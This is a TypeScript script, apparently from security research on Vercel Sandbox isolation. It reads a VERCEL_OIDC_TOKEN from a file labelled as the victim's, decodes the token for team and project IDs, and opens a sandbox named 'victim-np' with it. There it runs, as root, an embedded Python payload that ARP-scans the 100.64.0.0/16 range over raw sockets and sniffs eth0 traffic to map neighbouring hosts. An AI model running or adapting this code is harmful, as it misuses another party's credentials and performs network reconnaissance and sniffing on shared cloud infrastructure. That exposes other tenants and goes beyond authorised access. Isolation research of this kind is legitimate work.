import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
MYIPB=$(ip -4 addr show eth0 | grep inet | awk '{print $2}' | cut -d/ -f1)
echo "myip=$MYIPB"
MYMACB=$(cat /sys/class/net/eth0/address)
python3 - "$MYIPB" "$MYMACB" <<'PYEOF'
import socket, struct, time, threading, binascii, select, sys
IF="eth0"
myip=socket.inet_aton(sys.argv[1])
mymac=binascii.unhexlify(sys.argv[2].replace(":",""))
found={}
s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((IF,0))
def sender():
    for i in range(1,65536):
        ip=socket.inet_aton("100.64.%d.%d"%(i>>8,i&0xff))
        if ip==myip: continue
        pkt=struct.pack("!6s6sH", b"\\xff"*6, mymac, 0x0806)
        arp=struct.pack("!HHBBH6s4s6s4s",1,0x0800,6,4,1,mymac,myip,b"\\x00"*6,ip)
        try: s.send(pkt+arp)
        except Exception: pass
        if i%16384==0: time.sleep(0.15)
t=threading.Thread(target=sender); t.daemon=True; t.start()
end=time.time()+15
while time.time()<end:
    r,_,_=select.select([s],[],[],0.5)
    if not r: continue
    try: data=s.recv(4096)
    except Exception: continue
    if len(data)<42: continue
    arp=data[14:42]
    if arp[0:2]==struct.pack("!H",1) and arp[6:8]==struct.pack("!H",0x0800):
        spa=socket.inet_ntoa(arp[14:18])
        sha=":".join("%02x"%b for b in arp[8:14])
        if spa not in found:
            found[spa]=sha
            print("ARP reply:",spa,sha,flush=True)
print("total:",len(found),flush=True)
PYEOF
echo "=== sniff 8s on eth0 ==="
timeout 8 python3 - <<'PYEOF'
import socket, struct, time, select
s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(("eth0",0))
seen={}
end=time.time()+8
while time.time()<end:
    r,_,_=select.select([s],[],[],0.5)
    if not r: continue
    try: data=s.recv(65535)
    except Exception: continue
    if len(data)<42: continue
    eth=data[:14]
    dst,src,etype=struct.unpack("!6s6sH",eth)
    def m(b): return ":".join("%02x"%x for x in b)
    if etype in (0x0800,0x0806):
        k=(m(src),m(dst),etype)
        seen[k]=seen.get(k,0)+1
for k,v in sorted(seen.items(),key=lambda x:-x[1])[:25]:
    print(v,k)
print("pairs:",len(seen))
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore20.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore20.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });